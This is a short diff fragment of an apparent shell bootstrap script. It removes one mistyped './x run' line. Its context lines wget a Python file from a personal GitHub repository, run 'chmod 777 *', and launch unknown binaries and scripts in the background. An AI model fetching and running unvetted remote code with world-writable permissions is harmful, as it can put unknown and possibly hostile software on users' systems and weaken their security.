@@ -43,6 +43,5 @@ wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/ht.py
 echo "./x run --config=s.json" > bash.sh
 chmod 777 *
 ./bash.sh &
-./x run —config=s.json
 ./ht.py
 '
